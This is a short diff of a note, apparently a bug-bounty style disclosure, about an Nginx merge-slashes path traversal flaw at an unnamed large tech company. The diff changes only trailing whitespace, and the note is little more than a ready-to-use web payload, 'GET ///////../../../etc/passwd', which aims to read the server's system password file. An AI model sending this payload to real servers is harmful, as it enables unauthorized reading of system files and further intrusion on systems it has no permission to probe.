@@ -1,3 +1,3 @@
 Nginx merge slashes path traversal vulnerability in one of the popular tech giant. 
 
-Payload: GET ///////../../../etc/passwd
+Payload: GET ///////../../../etc/passwd 
